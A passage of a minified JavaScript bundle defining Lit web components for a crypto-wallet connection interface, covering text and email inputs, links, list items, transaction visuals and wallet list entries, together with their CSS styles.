 */const Po=(t,e)=>{var r;const n=t._$AN;if(n===void 0)return!1;for(const o of n)(r=o._$AO)==null||r.call(o,e,!1),Po(o,e);return!0},Ms=t=>{let e,n;do{if((e=t._$AM)===void 0)break;n=e._$AN,n.delete(t),t=e}while((n==null?void 0:n.size)===0)},Mp=t=>{for(let e;e=t._$AM;t=e){let n=e._$AN;if(n===void 0)e._$AN=n=new Set;else if(n.has(t))break;n.add(t),ev(e)}};function X3(t){this._$AN!==void 0?(Ms(this),this._$AM=t,Mp(this)):this._$AM=t}function Q3(t,e=!1,n=0){const r=this._$AH,o=this._$AN;if(o!==void 0&&o.size!==0)if(e)if(Array.isArray(r))for(let i=n;i<r.length;i++)Po(r[i],!1),Ms(r[i]);else r!=null&&(Po(r,!1),Ms(r));else Po(this,t)}const ev=t=>{t.type==$p.CHILD&&(t._$AP??(t._$AP=Q3),t._$AQ??(t._$AQ=X3))};class tv extends Pp{constructor(){super(...arguments),this._$AN=void 0}_$AT(e,n,r){super._$AT(e,n,r),Mp(this),this.isConnected=e._$AU}_$AO(e,n=!0){var r,o;e!==this.isConnected&&(this.isConnected=e,e?(r=this.reconnected)==null||r.call(this):(o=this.disconnected)==null||o.call(this)),n&&(Po(this,e),Ms(this))}setValue(e){if(J3(this._$Ct))this._$Ct._$AI(e,this);else{const n=[...this._$Ct._$AH];n[this._$Ci]=e,this._$Ct._$AI(n,this,0)}}disconnected(){}reconnected(){}}/**
 * @license
 * Copyright 2020 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const Uc=()=>new nv;let nv=class{};const Al=new WeakMap,Bc=Op(class extends tv{render(t){return rt}update(t,[e]){var r;const n=e!==this.G;return n&&this.G!==void 0&&this.ot(void 0),(n||this.rt!==this.lt)&&(this.G=e,this.ct=(r=t.options)==null?void 0:r.host,this.ot(this.lt=t.element)),rt}ot(t){if(typeof this.G=="function"){const e=this.ct??globalThis;let n=Al.get(e);n===void 0&&(n=new WeakMap,Al.set(e,n)),n.get(this.G)!==void 0&&this.G.call(this.ct,void 0),n.set(this.G,t),t!==void 0&&this.G.call(this.ct,t)}else this.G.value=t}get rt(){var t,e;return typeof this.G=="function"?(t=Al.get(this.ct??globalThis))==null?void 0:t.get(this.G):(e=this.G)==null?void 0:e.value}disconnected(){this.rt===this.lt&&this.ot(void 0)}reconnected(){this.ot(this.lt)}}),rv=q`
  :host {
    position: relative;
    width: 100%;
    display: inline-block;
    color: var(--wui-color-fg-275);
  }

  input {
    width: 100%;
    border-radius: var(--wui-border-radius-xs);
    border: 1px solid var(--wui-gray-glass-005);
    background: var(--wui-gray-glass-005);
    font-size: var(--wui-font-size-paragraph);
    font-weight: var(--wui-font-weight-light);
    letter-spacing: var(--wui-letter-spacing-paragraph);
    color: var(--wui-color-fg-100);
    transition: all var(--wui-ease-inout-power-1) var(--wui-duration-lg);
    caret-color: var(--wui-color-accent-100);
  }

  input:disabled {
    cursor: not-allowed;
    border: 1px solid var(--wui-gray-glass-010);
    background: var(--wui-gray-glass-015);
  }

  input:disabled::placeholder,
  input:disabled + wui-icon {
    color: var(--wui-color-fg-300);
  }

  input::placeholder {
    color: var(--wui-color-fg-275);
  }

  input:focus:enabled {
    transition: all var(--wui-ease-out-power-2) var(--wui-duration-sm);
    background-color: var(--wui-gray-glass-010);
    border: 1px solid var(--wui-color-accent-100);
    -webkit-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    -moz-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
  }

  input:hover:enabled {
    background-color: var(--wui-gray-glass-010);
  }

  wui-icon {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    pointer-events: none;
  }

  .wui-size-sm {
    padding: 9px var(--wui-spacing-m) 10px var(--wui-spacing-s);
  }

  wui-icon + .wui-size-sm {
    padding: 9px var(--wui-spacing-m) 10px 36px;
  }

  wui-icon[data-input='sm'] {
    left: var(--wui-spacing-s);
  }

  .wui-size-md {
    padding: 15px var(--wui-spacing-m) var(--wui-spacing-l) var(--wui-spacing-m);
  }

  wui-icon + .wui-size-md {
    padding: 10.5px var(--wui-spacing-l) 10.5px 44px;
  }

  wui-icon[data-input='md'] {
    left: var(--wui-spacing-l);
  }

  input:placeholder-shown ~ ::slotted(wui-input-element),
  input:placeholder-shown ~ ::slotted(wui-icon) {
    opacity: 0;
    pointer-events: none;
  }

  ::slotted(wui-input-element),
  ::slotted(wui-icon) {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    transition: all var(--wui-ease-in-power-2) var(--wui-duration-md);
  }

  ::slotted(wui-input-element) {
    right: var(--wui-spacing-m);
  }

  ::slotted(wui-icon) {
    right: 0px;
  }
`;var Er=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let cn=class extends H{constructor(){super(...arguments),this.inputElementRef=Uc(),this.size="md",this.disabled=!1,this.placeholder="",this.type="text"}render(){const e=`wui-size-${this.size}`;return $` ${this.templateIcon()}
      <input
        ${Bc(this.inputElementRef)}
        class=${e}
        type=${this.type}
        enterkeyhint=${ve(this.enterKeyHint)}
        ?disabled=${this.disabled}
        placeholder=${this.placeholder}
        @input=${this.dispatchInputChangeEvent.bind(this)}
        value=${ve(this.value)}
      />
      <slot></slot>`}templateIcon(){return this.icon?$`<wui-icon
        data-input=${this.size}
        size="sm"
        color="inherit"
        name=${this.icon}
      ></wui-icon>`:null}dispatchInputChangeEvent(){var e;this.dispatchEvent(new CustomEvent("inputChange",{detail:(e=this.inputElementRef.value)==null?void 0:e.value,bubbles:!0,composed:!0}))}};cn.styles=[pe,Ye,rv];Er([O()],cn.prototype,"size",void 0);Er([O()],cn.prototype,"icon",void 0);Er([O({type:Boolean})],cn.prototype,"disabled",void 0);Er([O()],cn.prototype,"placeholder",void 0);Er([O()],cn.prototype,"type",void 0);Er([O()],cn.prototype,"keyHint",void 0);Er([O()],cn.prototype,"value",void 0);cn=Er([z("wui-input-text")],cn);const iv=q`
  :host {
    position: relative;
    display: inline-block;
  }

  wui-text {
    margin: var(--wui-spacing-xxs) var(--wui-spacing-m) var(--wui-spacing-0) var(--wui-spacing-m);
  }
`;var Lc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Qr=class extends H{constructor(){super(...arguments),this.disabled=!1}render(){return $`
      <wui-input-text
        placeholder="Email"
        icon="mail"
        size="md"
        .disabled=${this.disabled}
        .value=${this.value}
        data-testid="wui-email-input"
      ></wui-input-text>
      ${this.templateError()}
    `}templateError(){return this.errorMessage?$`<wui-text variant="tiny-500" color="error-100">${this.errorMessage}</wui-text>`:null}};Qr.styles=[pe,iv];Lc([O()],Qr.prototype,"errorMessage",void 0);Lc([O({type:Boolean})],Qr.prototype,"disabled",void 0);Lc([O()],Qr.prototype,"value",void 0);Qr=Lc([z("wui-email-input")],Qr);const ov=q`
  button {
    border-radius: var(--wui-border-radius-xxs);
    color: var(--wui-color-fg-100);
    padding: var(--wui-spacing-2xs);
  }

  @media (max-width: 700px) {
    button {
      padding: var(--wui-spacing-s);
    }
  }

  button > wui-icon {
    pointer-events: none;
  }

  button:disabled > wui-icon {
    color: var(--wui-color-bg-300) !important;
  }

  button:disabled {
    background-color: transparent;
  }
`;var za=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let pr=class extends H{constructor(){super(...arguments),this.size="md",this.disabled=!1,this.icon="copy",this.iconColor="inherit"}render(){return $`
      <button ?disabled=${this.disabled} ontouchstart>
        <wui-icon color=${this.iconColor} size=${this.size} name=${this.icon}></wui-icon>
      </button>
    `}};pr.styles=[pe,Ye,Nd,ov];za([O()],pr.prototype,"size",void 0);za([O({type:Boolean})],pr.prototype,"disabled",void 0);za([O()],pr.prototype,"icon",void 0);za([O()],pr.prototype,"iconColor",void 0);pr=za([z("wui-icon-link")],pr);const av=q`
  button {
    background-color: var(--wui-color-fg-300);
    border-radius: var(--wui-border-radius-4xs);
    width: 16px;
    height: 16px;
  }

  button:disabled {
    background-color: var(--wui-color-bg-300);
  }

  wui-icon {
    color: var(--wui-color-bg-200) !important;
  }

  button:focus-visible {
    background-color: var(--wui-color-fg-250);
    border: 1px solid var(--wui-color-accent-100);
  }

  button:active:enabled {
    background-color: var(--wui-color-fg-225);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-fg-250);
    }
  }
`;var Up=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let sa=class extends H{constructor(){super(...arguments),this.icon="copy"}render(){return $`
      <button>
        <wui-icon color="inherit" size="xxs" name=${this.icon}></wui-icon>
      </button>
    `}};sa.styles=[pe,Ye,av];Up([O()],sa.prototype,"icon",void 0);sa=Up([z("wui-input-element")],sa);const sv=q`
  :host {
    position: relative;
    display: inline-block;
  }

  input {
    width: 50px;
    height: 50px;
    background: var(--wui-gray-glass-005);
    border-radius: var(--wui-border-radius-xs);
    border: 1px solid var(--wui-gray-glass-005);
    font-family: var(--wui-font-family);
    font-size: var(--wui-font-size-large);
    font-weight: var(--wui-font-weight-regular);
    letter-spacing: var(--wui-letter-spacing-large);
    text-align: center;
    color: var(--wui-color-fg-100);
    caret-color: var(--wui-color-accent-100);
    transition: all var(--wui-ease-inout-power-1) var(--wui-duration-lg);
    box-sizing: border-box;
    -webkit-appearance: none;
    -moz-appearance: textfield;
    padding: 0px;
  }

  input::-webkit-outer-spin-button,
  input::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }

  input[type='number'] {
    -moz-appearance: textfield;
  }

  input:disabled {
    cursor: not-allowed;
    border: 1px solid var(--wui-gray-glass-010);
    background: var(--wui-gray-glass-015);
  }

  input:focus:enabled {
    transition: all var(--wui-ease-out-power-2) var(--wui-duration-sm);
    background-color: var(--wui-gray-glass-010);
    border: 1px solid var(--wui-color-accent-100);
    -webkit-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    -moz-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
  }
  @media (hover: hover) and (pointer: fine) {
    input:hover:enabled {
      background-color: var(--wui-gray-glass-010);
    }
  }
`;var Bp=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let ca=class extends H{constructor(){super(...arguments),this.disabled=!1}render(){return $`<input
      type="number"
      maxlength="1"
      inputmode="numeric"
      autofocus
      ?disabled=${this.disabled}
    /> `}};ca.styles=[pe,Ye,sv];Bp([O({type:Boolean})],ca.prototype,"disabled",void 0);ca=Bp([z("wui-input-numeric")],ca);const cv=q`
  button {
    padding: var(--wui-spacing-4xs) var(--wui-spacing-xxs);
    border-radius: var(--wui-border-radius-3xs);
    background-color: transparent;
    color: var(--wui-color-accent-100);
  }

  button:disabled {
    background-color: transparent;
    color: var(--wui-gray-glass-015);
  }
`;var Bd=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Fi=class extends H{constructor(){super(...arguments),this.disabled=!1,this.color="inherit"}render(){return $`
      <button ?disabled=${this.disabled} ontouchstart>
        <slot name="iconLeft"></slot>
        <wui-text variant="small-600" color=${this.color}>
          <slot></slot>
        </wui-text>
        <slot name="iconRight"></slot>
      </button>
    `}};Fi.styles=[pe,Ye,cv];Bd([O({type:Boolean})],Fi.prototype,"disabled",void 0);Bd([O()],Fi.prototype,"color",void 0);Fi=Bd([z("wui-link")],Fi);const lv=q`
  button {
    column-gap: var(--wui-spacing-s);
    padding: 11px 18px 11px var(--wui-spacing-s);
    width: 100%;
    background-color: var(--wui-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-250);
  }

  button[data-iconvariant='square'],
  button[data-iconvariant='square-blue'] {
    padding: 6px 18px 6px 9px;
  }

  button > wui-flex {
    flex: 1;
  }

  button > wui-image {
    width: 32px;
    height: 32px;
    box-shadow: 0 0 0 2px var(--wui-gray-glass-005);
    border-radius: var(--wui-border-radius-3xl);
  }

  button > wui-icon {
    width: 36px;
    height: 36px;
  }

  button > wui-icon-box[data-variant='blue'] {
    box-shadow: 0 0 0 2px var(--wui-accent-glass-005);
  }

  button > wui-icon-box[data-variant='overlay'] {
    box-shadow: 0 0 0 2px var(--wui-gray-glass-005);
  }

  button > wui-icon-box[data-variant='square-blue'] {
    border-radius: var(--wui-border-radius-3xs);
    position: relative;
    border: none;
    width: 36px;
    height: 36px;
  }

  button > wui-icon-box[data-variant='square-blue']::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-accent-glass-010);
    pointer-events: none;
  }

  button > wui-icon:last-child {
    width: 14px;
    height: 14px;
  }

  button:disabled {
    background-color: var(--wui-gray-glass-015);
    color: var(--wui-gray-glass-015);
  }

  button[data-loading='true'] > wui-icon {
    transition: opacity 200ms ease-in-out;
    opacity: 0;
  }

  wui-loading-spinner {
    position: absolute;
    right: 18px;
    top: 50%;
    transform: translateY(-50%);
  }
`;var Dn=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let jt=class extends H{constructor(){super(...arguments),this.variant="icon",this.disabled=!1,this.imageSrc=void 0,this.alt=void 0,this.chevron=!1,this.loading=!1}render(){return $`
      <button
        ?disabled=${this.loading?!0:!!this.disabled}
        data-loading=${this.loading}
        data-iconvariant=${ve(this.iconVariant)}
        ontouchstart
      >
        ${this.loadingTemplate()} ${this.visualTemplate()}
        <wui-flex gap="3xs">
          <slot></slot>
        </wui-flex>
        ${this.chevronTemplate()}
      </button>
    `}visualTemplate(){if(this.variant==="image"&&this.imageSrc)return $`<wui-image src=${this.imageSrc} alt=${this.alt??"list item"}></wui-image>`;if(this.iconVariant==="square"&&this.icon&&this.variant==="icon")return $`<wui-icon name=${this.icon}></wui-icon>`;if(this.variant==="icon"&&this.icon&&this.iconVariant){const e=["blue","square-blue"].includes(this.iconVariant)?"accent-100":"fg-200",n=this.iconVariant==="square-blue"?"mdl":"md",r=this.iconSize?this.iconSize:n;return $`
        <wui-icon-box
          data-variant=${this.iconVariant}
          icon=${this.icon}
          iconSize=${r}
          background="transparent"
          iconColor=${e}
          backgroundColor=${e}
          size=${n}
        ></wui-icon-box>
      `}return null}loadingTemplate(){return this.loading?$`<wui-loading-spinner color="fg-300"></wui-loading-spinner>`:$``}chevronTemplate(){return this.chevron?$`<wui-icon size="inherit" color="fg-200" name="chevronRight"></wui-icon>`:null}};jt.styles=[pe,Ye,lv];Dn([O()],jt.prototype,"icon",void 0);Dn([O()],jt.prototype,"iconSize",void 0);Dn([O()],jt.prototype,"variant",void 0);Dn([O()],jt.prototype,"iconVariant",void 0);Dn([O({type:Boolean})],jt.prototype,"disabled",void 0);Dn([O()],jt.prototype,"imageSrc",void 0);Dn([O()],jt.prototype,"alt",void 0);Dn([O({type:Boolean})],jt.prototype,"chevron",void 0);Dn([O({type:Boolean})],jt.prototype,"loading",void 0);jt=Dn([z("wui-list-item")],jt);var mu;(function(t){t.approve="approved",t.bought="bought",t.borrow="borrowed",t.burn="burnt",t.cancel="canceled",t.claim="claimed",t.deploy="deployed",t.deposit="deposited",t.execute="executed",t.mint="minted",t.receive="received",t.repay="repaid",t.send="sent",t.sell="sold",t.stake="staked",t.trade="swapped",t.unstake="unstaked",t.withdraw="withdrawn"})(mu||(mu={}));const uv=q`
  :host > wui-flex {
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    width: 40px;
    height: 40px;
    box-shadow: inset 0 0 0 1px var(--wui-gray-glass-005);
    background-color: var(--wui-gray-glass-005);
  }

  :host > wui-flex wui-image {
    display: block;
    z-index: -1;
  }

  :host > wui-flex,
  :host > wui-flex wui-image,
  .swap-images-container,
  .swap-images-container.nft,
  wui-image.nft {
    border-top-left-radius: var(--local-left-border-radius);
    border-top-right-radius: var(--local-right-border-radius);
    border-bottom-left-radius: var(--local-left-border-radius);
    border-bottom-right-radius: var(--local-right-border-radius);
  }

  wui-icon {
    width: 20px;
    height: 20px;
  }

  wui-icon-box {
    position: absolute;
    right: 0;
    bottom: 0;
    transform: translate(20%, 20%);
  }

  .swap-images-container {
    position: relative;
    width: 40px;
    height: 40px;
    overflow: hidden;
  }

  .swap-images-container wui-image:first-child {
    position: absolute;
    width: 40px;
    height: 40px;
    top: 0;
    left: 0%;
    clip-path: inset(0px calc(50% + 2px) 0px 0%);
  }

  .swap-images-container wui-image:last-child {
    clip-path: inset(0px 0px 0px calc(50% + 2px));
  }
`;var pi=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let An=class extends H{constructor(){super(...arguments),this.images=[],this.secondImage={type:void 0,url:""}}render(){const[e,n]=this.images,r=(e==null?void 0:e.type)==="NFT",o=n!=null&&n.url?n.type==="NFT":r,i=r?"var(--wui-border-radius-xxs)":"var(--wui-border-radius-s)",a=o?"var(--wui-border-radius-xxs)":"var(--wui-border-radius-s)";return this.style.cssText=`
    --local-left-border-radius: ${i};
    --local-right-border-radius: ${a};
    `,$`<wui-flex> ${this.templateVisual()} ${this.templateIcon()} </wui-flex>`}templateVisual(){const[e,n]=this.images,r=e==null?void 0:e.type;return this.images.length===2&&(e!=null&&e.url||n!=null&&n.url)?$`<div class="swap-images-container">
        ${e!=null&&e.url?$`<wui-image src=${e.url} alt="Transaction image"></wui-image>`:null}
        ${n!=null&&n.url?$`<wui-image src=${n.url} alt="Transaction image"></wui-image>`:null}
      </div>`:e!=null&&e.url?$`<wui-image src=${e.url} alt="Transaction image"></wui-image>`:r==="NFT"?$`<wui-icon size="inherit" color="fg-200" name="nftPlaceholder"></wui-icon>`:$`<wui-icon size="inherit" color="fg-200" name="coinPlaceholder"></wui-icon>`}templateIcon(){let e="accent-100",n;return n=this.getIcon(),this.status&&(e=this.getStatusColor()),n?$`
      <wui-icon-box
        size="xxs"
        iconColor=${e}
        backgroundColor=${e}
        background="opaque"
        icon=${n}
        ?border=${!0}
        borderColor="wui-color-bg-125"
      ></wui-icon-box>
    `:null}getDirectionIcon(){switch(this.direction){case"in":return"arrowBottom";case"out":return"arrowTop";default:return}}getIcon(){return this.onlyDirectionIcon?this.getDirectionIcon():this.type==="trade"?"swapHorizontalBold":this.type==="approve"?"checkmark":this.type==="cancel"?"close":this.getDirectionIcon()}getStatusColor(){switch(this.status){case"confirmed":return"success-100";case"failed":return"error-100";case"pending":return"inverse-100";default:return"accent-100"}}};An.styles=[uv];pi([O()],An.prototype,"type",void 0);pi([O()],An.prototype,"status",void 0);pi([O()],An.prototype,"direction",void 0);pi([O({type:Boolean})],An.prototype,"onlyDirectionIcon",void 0);pi([O({type:Array})],An.prototype,"images",void 0);pi([O({type:Object})],An.prototype,"secondImage",void 0);An=pi([z("wui-transaction-visual")],An);const dv=q`
  :host > wui-flex:first-child {
    align-items: center;
    column-gap: var(--wui-spacing-s);
    padding: 6.5px var(--wui-spacing-l) 6.5px var(--wui-spacing-xs);
    width: 100%;
  }

  :host > wui-flex:first-child wui-text:nth-child(1) {
    text-transform: capitalize;
  }

  wui-transaction-visual {
    width: 40px;
    height: 40px;
  }

  wui-flex {
    flex: 1;
  }

  :host wui-flex wui-flex {
    overflow: hidden;
  }

  :host .description-container wui-text span {
    word-break: break-all;
  }

  :host .description-container wui-text {
    overflow: hidden;
  }

  :host .description-separator-icon {
    margin: 0px 6px;
  }

  :host wui-text > span {
    overflow: hidden;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 1;
  }
`;var Cr=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let ln=class extends H{constructor(){super(...arguments),this.type="approve",this.onlyDirectionIcon=!1,this.images=[]}render(){return $`
      <wui-flex>
        <wui-transaction-visual
          .status=${this.status}
          direction=${ve(this.direction)}
          type=${this.type}
          onlyDirectionIcon=${ve(this.onlyDirectionIcon)}
          .images=${this.images}
        ></wui-transaction-visual>
        <wui-flex flexDirection="column" gap="3xs">
          <wui-text variant="paragraph-600" color="fg-100">
            ${mu[this.type]}
          </wui-text>
          <wui-flex class="description-container">
            ${this.templateDescription()} ${this.templateSecondDescription()}
          </wui-flex>
        </wui-flex>
        <wui-text variant="micro-700" color="fg-300"><span>${this.date}</span></wui-text>
      </wui-flex>
    `}templateDescription(){var n;const e=(n=this.descriptions)==null?void 0:n[0];return e?$`
          <wui-text variant="small-500" color="fg-200">
            <span>${e}</span>
          </wui-text>
        `:null}templateSecondDescription(){var n;const e=(n=this.descriptions)==null?void 0:n[1];return e?$`
          <wui-icon class="description-separator-icon" size="xxs" name="arrowRight"></wui-icon>
          <wui-text variant="small-400" color="fg-200">
            <span>${e}</span>
          </wui-text>
        `:null}};ln.styles=[pe,dv];Cr([O()],ln.prototype,"type",void 0);Cr([O({type:Array})],ln.prototype,"descriptions",void 0);Cr([O()],ln.prototype,"date",void 0);Cr([O({type:Boolean})],ln.prototype,"onlyDirectionIcon",void 0);Cr([O()],ln.prototype,"status",void 0);Cr([O()],ln.prototype,"direction",void 0);Cr([O({type:Array})],ln.prototype,"images",void 0);ln=Cr([z("wui-transaction-list-item")],ln);const fv=q`
  :host > wui-flex:first-child {
    column-gap: var(--wui-spacing-s);
    padding: 7px var(--wui-spacing-l) 7px var(--wui-spacing-xs);
    width: 100%;
  }

  wui-flex {
    display: flex;
    flex: 1;
  }
`;var hv=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Us=class extends H{render(){return $`
      <wui-flex alignItems="center">
        <wui-shimmer width="40px" height="40px"></wui-shimmer>
        <wui-flex flexDirection="column" gap="2xs">
          <wui-shimmer width="72px" height="16px" borderRadius="4xs"></wui-shimmer>
          <wui-shimmer width="148px" height="14px" borderRadius="4xs"></wui-shimmer>
        </wui-flex>
        <wui-shimmer width="24px" height="12px" borderRadius="5xs"></wui-shimmer>
      </wui-flex>
    `}};Us.styles=[pe,fv];Us=hv([z("wui-transaction-list-item-loader")],Us);const pv=q`
  :host {
    display: block;
    padding: 3.5px 5px !important;
    border-radius: var(--wui-border-radius-5xs);
  }

  :host([data-variant='main']) {
    background-color: var(--wui-accent-glass-015);
    color: var(--wui-color-accent-100);
  }

  :host([data-variant='shade']) {
    background-color: var(--wui-gray-glass-010);
    color: var(--wui-color-fg-200);
  }

  :host([data-variant='success']) {
    background-color: var(--wui-icon-box-bg-success-100);
    color: var(--wui-color-success-100);
  }

  :host([data-variant='error']) {
    background-color: var(--wui-icon-box-bg-error-100);
    color: var(--wui-color-error-100);
  }
`;var Lp=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let la=class extends H{constructor(){super(...arguments),this.variant="main"}render(){return this.dataset.variant=this.variant,$`
      <wui-text data-variant=${this.variant} variant="micro-700" color="inherit">
        <slot></slot>
      </wui-text>
    `}};la.styles=[pe,pv];Lp([O()],la.prototype,"variant",void 0);la=Lp([z("wui-tag")],la);const mv=q`
  button {
    column-gap: var(--wui-spacing-s);
    padding: 7px var(--wui-spacing-l) 7px var(--wui-spacing-xs);
    width: 100%;
    background-color: var(--wui-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-100);
  }

  button > wui-text:nth-child(2) {
    display: flex;
    flex: 1;
  }

  wui-icon {
    color: var(--wui-color-fg-200) !important;
  }

  button:disabled {
    background-color: var(--wui-gray-glass-015);
    color: var(--wui-gray-glass-015);
  }

  button:disabled > wui-tag {
    background-color: var(--wui-gray-glass-010);
    color: var(--wui-color-fg-300);
  }
`;var pn=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Dt=class extends H{constructor(){super(...arguments),this.walletImages=[],this.imageSrc="",this.name="",this.installed=!1,this.disabled=!1,this.showAllWallets=!1}render(){return $`
      <button ?disabled=${this.disabled} ontouchstart>
        ${this.templateAllWallets()} ${this.templateWalletImage()}
        <wui-text variant="paragraph-500" color="inherit">${this.name}</wui-text>
        ${this.templateStatus()}
      </button>
    `}templateAllWallets(){return this.showAllWallets&&this.imageSrc?$` <wui-all-wallets-image .imageeSrc=${this.imageSrc}> </wui-all-wallets-image> `:this.showAllWallets&&this.walletIcon?$` <wui-wallet-image .walletIcon=${this.walletIcon} size="sm"> </wui-wallet-image> `:null}templateWalletImage(){return!this.showAllWallets&&this.imageSrc?$`<wui-wallet-image
        size="sm"
        imageSrc=${this.imageSrc}
        name=${this.name}
        .installed=${this.installed}
      ></wui-wallet-image>`:!this.showAllWallets&&!this.imageSrc?$`<wui-wallet-image size="sm" name=${this.name}></wui-wallet-image>`:null}templateStatus(){return this.tagLabel&&this.tagVariant?$`<wui-tag variant=${this.tagVariant}>${this.tagLabel}</wui-tag>`:this.icon?$`<wui-icon color="inherit" size="sm" name=${this.icon}></wui-icon>`:null}};Dt.styles=[pe,Ye,mv];pn([O({type:Array})],Dt.prototype,"walletImages",void 0);pn([O()],Dt.prototype,"imageSrc",void 0);pn([O()],Dt.prototype,"name",void 0);pn([O()],Dt.prototype,"tagLabel",void 0);pn([O()],Dt.prototype,"tagVariant",void 0);pn([O()],Dt.prototype,"icon",void 0);pn([O()],Dt.prototype,"walletIcon",void 0);pn([O({type:Boolean})],Dt.prototype,"installed",void 0);pn([O({type:Boolean})],Dt.prototype,"disabled",void 0);pn([O({type:Boolean})],Dt.prototype,"showAllWallets",void 0);Dt=pn([z("wui-list-wallet")],Dt);const gv=q`
  :host {
    display: block;
    width: 40px;
    height: 40px;
    border-radius: var(--wui-border-radius-3xl);
    border: 1px solid var(--wui-gray-glass-010);
    overflow: hidden;
  }

  wui-icon {
    width: 100%;
    height: 100%;
  }
